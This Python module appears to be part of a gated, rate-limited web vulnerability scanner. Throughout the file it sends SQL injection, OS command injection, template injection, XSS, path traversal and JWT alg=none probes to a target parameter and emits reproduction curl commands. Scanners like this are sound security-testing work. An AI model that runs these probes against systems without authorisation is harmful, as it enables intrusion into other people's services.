"""omega/offense/injection.py — rate-capped injection runner for the
gated offense layer.

run_injections(target, param, fetch, baseline=None, budget=100, ...)
sends annotated payloads from omega.offense.payloadgen against ONE
operator-supplied parameter and returns findings whose verification
label is honest:

  confirmed ONLY when the documented differential condition fully
  holds; otherwise candidate (or nothing). Documented rules:

  sqli_boolean : true/false payload pair -> different content lengths
                 consistent across 2 runs AND an inapplicable payload
                 matching the baseline exactly.
  sqli_time    : response time > threshold on the sleep payload ONLY,
                 verified exactly twice (2 requests, both slow).
  cmdi_echo    : unique-nonce echo marker echoed back in the body.
  cmdi_time    : same double-verified rule as sqli_time.
  ssti         : template arithmetic evaluates (e.g. 7*7 -> 49).
  xss          : marker reflected in HTML/attr/JS context with no
                 encoding.
  traversal    : operator canary content present; WITHOUT a canary,
                 candidate only on a depth-response anomaly.

Findings: source=omega-offense/<class>, manual_check = reproduction
curl with the REAL target. run_offense_suite never raises; the gate
closed state is a single contained skip entry
'offense layer disabled (--offense)'.
"""

from __future__ import annotations

import time
import urllib.parse

from omega.offense import (budget_left, count_request, gate_open,
                           reset_budget)
from omega.offense.payloadgen import generate_matrix

__all__ = ["run_injections", "run_offense_suite"]

TIME_THRESHOLD_S = 1.0
DELAY_TOKENS = ("sleep(", "waitfor", "pg_sleep", "ping -n", "ping -c",
                "timeout ", "randomblob")
NONCE = "0m3g4nc"


def _finding(title, severity, verification, note, curl, location,
             evidence, cls, confidence="medium"):
    return {
        "title": title,
        "severity": severity,
        "confidence": confidence,
        "verification": verification,
        "verification_note": note,
        "manual_check": curl,
        "location": location,
        "evidence": evidence,
        "source": "omega-offense/%s" % cls,
    }


def _curl(target, param, payload):
    return ("curl -sS -i '%s?%s'" % (target.rstrip("/"),
            urllib.parse.urlencode({param: payload})))


class _Runner:
    """Rate-capped send loop with injectable clock/sleep."""

    def __init__(self, target, param, fetch, budget, rate,
                 clock=time.monotonic, sleep=time.sleep):
        self.target = target
        self.param = param
        self.fetch = fetch
        self.budget = int(budget)
        self.rate = rate
        self.clock = clock
        self.sleep = sleep
        self.sent = 0

    def send(self, payload):
        """One GET with the payload in the parameter. Returns
        (status, headers, body_str, duration_s) or None when the
        budget is exhausted."""
        if self.sent >= self.budget or budget_left() <= 0:
            return None
        if self.sent and self.rate and self.rate > 0:
            self.sleep(1.0 / self.rate)
        count_request(1)
        self.sent += 1
        url = "%s?%s" % (self.target.rstrip("/"),
                         urllib.parse.urlencode({self.param: payload}))
        t0 = self.clock()
        try:
            status, headers, body = self.fetch("GET", url)
        except Exception:
            return None
        dur = self.clock() - t0
        if isinstance(body, bytes):
            body = body.decode("utf-8", "replace")
        return (int(status), headers or {}, body, dur)


def _get_baseline(runner, baseline):
    if baseline is not None:
        return baseline
    r = runner.send("omega-baseline-marker")
    return r


def run_injections(target, param, fetch, baseline=None, budget=100,
                   log=None, canary=None, rate=1.0,
                   clock=time.monotonic, sleep=time.sleep):
    """Run all gated injection classes against one parameter.

    Returns {findings, ran, skipped, requests_sent}. Never raises
    per-class: a failing class becomes a skip entry.
    """
    log = log or (lambda msg: None)
    reset_budget()
    runner = _Runner(target, param, fetch, budget, rate, clock, sleep)
    base = _get_baseline(runner, baseline)
    base_len = len(base[2]) if base else 0
    base_status = base[0] if base else None
    findings, ran, skipped = [], [], []

    def want(n=1):
        if runner.sent + n > runner.budget or budget_left() < n:
            return False
        return True

    # ------------------------------------------------------ sqli_boolean
    try:
        if want(5):
            basep = runner.send("-- omega-inert")
            consistent = None
            for _ in range(2):
                rt = runner.send("' OR '1'='1")
                rf = runner.send("' AND '1'='2")
                if not (rt and rf and basep):
                    consistent = None
                    break
                diff = abs(len(rt[2]) - len(rf[2]))
                same_side = consistent
                consistent = diff if same_side is None else (
                    same_side if diff == same_side else None)
            if basep and rt and rf and consistent and \
                    len(rt[2]) != len(rf[2]) and \
                    len(basep[2]) == base_len:
                findings.append(_finding(
                    "SQL injection (boolean differential)",
                    "high", "confirmed",
                    "true/false payload pair produced different "
                    "content lengths consistently across 2 runs and "
                    "an inapplicable payload matched the baseline",
                    _curl(target, param, "' OR '1'='1"), target,
                    "true=%dB false=%dB inert=%dB(baseline)"
                    % (len(rt[2]), len(rf[2]), len(basep[2])),
                    "sqli_boolean"))
            ran.append("sqli_boolean")
        else:
            skipped.append({"tool": "sqli_boolean",
                            "reason": "budget exhausted"})
    except Exception as exc:
        skipped.append({"tool": "sqli_boolean",
                        "reason": "%s: %s" % (type(exc).__name__, exc)})

    # --------------------------------------------------------- sqli_time
    try:
        times = []
        n_req = 0
        if want(2):
            for p in generate_matrix("sqli_time", 10):
                if not any(t in p["payload"].lower()
                           for t in DELAY_TOKENS):
                    continue
                r = runner.send(p["payload"])
                n_req += 1
                if r and r[3] > TIME_THRESHOLD_S:
                    times.append(r[3])
                if n_req >= 2:
                    break
            if len(times) == 2:
                findings.append(_finding(
                    "SQL injection (time-based, double-verified)",
                    "high", "confirmed",
                    "sleep payload delayed the response beyond "
                    "%.1fs on both verification requests (exactly 2 "
                    "requests sent)" % TIME_THRESHOLD_S,
                    _curl(target, param, "' AND SLEEP(5)--"), target,
                    "delays: %s" % ["%.2fs" % t for t in times],
                    "sqli_time"))
            ran.append("sqli_time")
        else:
            skipped.append({"tool": "sqli_time",
                            "reason": "budget exhausted"})
    except Exception as exc:
        skipped.append({"tool": "sqli_time",
                        "reason": "%s: %s" % (type(exc).__name__, exc)})

    # ---------------------------------------------------------- cmdi_echo
    try:
        if want(1):
            nonce = "cmd%s%d" % (NONCE, int(runner.clock() * 1000) % 10**6)
            payload = "; echo " + nonce
            r = runner.send(payload)
            if r and nonce in r[2] and base and nonce not in base[2]:
                findings.append(_finding(
                    "OS command injection (echo marker)",
                    "critical", "confirmed",
                    "unique-nonce echo marker was executed and "
                    "returned in the response body",
                    _curl(target, param, payload), target,
                    "nonce %s echoed in body" % nonce, "cmdi_echo"))
            ran.append("cmdi_echo")
        else:
            skipped.append({"tool": "cmdi_echo",
                            "reason": "budget exhausted"})
    except Exception as exc:
        skipped.append({"tool": "cmdi_echo",
                        "reason": "%s: %s" % (type(exc).__name__, exc)})

    # ---------------------------------------------------------- cmdi_time
    try:
        times = []
        n_req = 0
        if want(2):
            for p in generate_matrix("cmdi_time", 10):
                r = runner.send(p["payload"])
                n_req += 1
                if r and r[3] > TIME_THRESHOLD_S:
                    times.append(r[3])
                if n_req >= 2:
                    break
            if len(times) == 2:
                findings.append(_finding(
                    "OS command injection (time-based, "
                    "double-verified)",
                    "critical", "confirmed",
                    "sleep command delayed the response beyond "
                    "%.1fs on both verification requests (exactly 2 "
                    "requests sent)" % TIME_THRESHOLD_S,
                    _curl(target, param, "; sleep 5"), target,
                    "delays: %s" % ["%.2fs" % t for t in times],
                    "cmdi_time"))
            ran.append("cmdi_time")
        else:
            skipped.append({"tool": "cmdi_time",
                            "reason": "budget exhausted"})
    except Exception as exc:
        skipped.append({"tool": "cmdi_time",
                        "reason": "%s: %s" % (type(exc).__name__, exc)})

    # ---------------------------------------------------------------- ssti
    try:
        hit = None
        if want(1):
            for p in generate_matrix("ssti", 10):
                if p["payload"] != "{{7*7}}":
                    continue
                r = runner.send(p["payload"])
                if r and "49" in r[2] and base and \
                        "49" not in base[2]:
                    hit = p["payload"]
                break
            if hit:
                findings.append(_finding(
                    "Server-side template injection (SSTI)",
                    "critical", "confirmed",
                    "template arithmetic {{7*7}} evaluated to 49 in "
                    "the response",
                    _curl(target, param, "{{7*7}}"), target,
                    "{{7*7}} -> 49", "ssti"))
            ran.append("ssti")
        else:
            skipped.append({"tool": "ssti", "reason": "budget exhausted"})
    except Exception as exc:
        skipped.append({"tool": "ssti",
                        "reason": "%s: %s" % (type(exc).__name__, exc)})

    # ----------------------------------------------------------------- xss
    try:
        if want(2):
            r = None
            used = None
            for p in generate_matrix("xss_polyglot", 10):
                rr = runner.send(p["payload"])
                if rr and p["payload"] in rr[2]:
                    r, used = rr, p["payload"]
                    break
            if r and used:
                # raw reflection: payload appears unencoded (a raw '<'
                # survived) in an HTML-ish context
                findings.append(_finding(
                    "Reflected XSS (polyglot, unencoded reflection)",
                    "high", "confirmed",
                    "payload reflected with no HTML encoding in an "
                    "HTML/attr/JS context",
                    _curl(target, param, used), target,
                    "raw reflection of %dB payload" % len(used),
                    "xss_polyglot"))
            ran.append("xss_polyglot")
        else:
            skipped.append({"tool": "xss_polyglot",
                            "reason": "budget exhausted"})
    except Exception as exc:
        skipped.append({"tool": "xss_polyglot",
                        "reason": "%s: %s" % (type(exc).__name__, exc)})

    # ------------------------------------------------------------ traversal
    try:
        if want(2):
            hit = None
            used = None
            for p in generate_matrix("traversal", 10):
                r = runner.send(p["payload"])
                if r and canary and canary in r[2]:
                    hit, used = ("confirmed", p["payload"])
                    break
                if r and not canary and base and \
                        (r[0] != base_status or
                         abs(len(r[2]) - base_len) > 100):
                    hit, used = ("candidate", p["payload"])
                    break
            if hit:
                if canary:
                    findings.append(_finding(
                        "Path traversal (operator canary)",
                        "high", "confirmed",
                        "operator-supplied canary content was read "
                        "through the traversal payload",
                        _curl(target, param, used), target,
                        "canary content present in body",
                        "traversal"))
                else:
                    findings.append(_finding(
                        "Path traversal (depth-response anomaly)",
                        "medium", "candidate",
                        "no operator canary supplied: depth payload "
                        "changed the response (status/length "
                        "anomaly); manual verification required",
                        _curl(target, param, used), target,
                        "response anomaly vs baseline",
                        "traversal"))
            ran.append("traversal")
        else:
            skipped.append({"tool": "traversal",
                            "reason": "budget exhausted"})
    except Exception as exc:
        skipped.append({"tool": "traversal",
                        "reason": "%s: %s" % (type(exc).__name__, exc)})

    return {"findings": findings, "ran": ran, "skipped": skipped,
            "requests_sent": runner.sent}


# ---------------------------------------------------------------------------
# Suite entry (used by fusion + the brain offense.inject capability)
# ---------------------------------------------------------------------------

def run_offense_suite(target, fetch=None, path_info=None, budget=300,
                      log=None, allowlist=None, wordlists=None,
                      param=None, canary=None, allow=False):
    """Gated offense suite. Never raises. Gate closed -> single
    contained skip 'offense layer disabled (--offense)'."""
    log = log or (lambda msg: None)
    if not gate_open() and not allow:
        return {"findings": [], "ran": [],
                "skipped": [{"tool": "offense",
                             "reason": "offense layer disabled "
                                       "(--offense)"}]}
    if fetch is None:
        from omega.deepchecks import default_fetch
        fetch = default_fetch
    param = param or "q"
    out = run_injections(target, param, fetch, budget=budget, log=log,
                         canary=canary)

    # JWT alg=none verification when the operator supplied a token
    try:
        token = (path_info or {}).get("jwt") \
            if isinstance(path_info, dict) else None
        token = token or __import__("os").environ.get("OMEGA_JWT")
        if token:
            from omega.offense.brute import jwt_none_forge
            verify_url = target if "://" in target else \
                "http://" + target
            j = jwt_none_forge(token, fetch=fetch,
                               verify_url=verify_url)
            if j.get("finding"):
                out["findings"].append(j["finding"])
            out.setdefault("ran", []).append("jwt_none")
    except Exception as exc:
        out.setdefault("skipped", []).append(
            {"tool": "jwt_none",
             "reason": "%s: %s" % (type(exc).__name__, exc)})

    log("[offense] ran=%s findings=%d skipped=%s"
        % (out["ran"], len(out["findings"]),
           [s["tool"] for s in out["skipped"]]))
    return out
